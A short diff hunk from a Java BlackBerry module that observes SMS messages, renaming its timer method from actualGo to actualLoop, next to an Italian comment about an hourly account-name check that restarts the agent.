@@ -201,7 +201,7 @@ public final class ModuleMessage extends BaseModule implements SmsObserver,
      * (non-Javadoc)
      * @see blackberry.threadpool.TimerJob#actualRun()
      */
-    public void actualGo() {
+    public void actualLoop() {
 
         // Ogni ora viene verificato se i nomi degli account corrisponde
         // se non corrisponde, restart dell'agente.
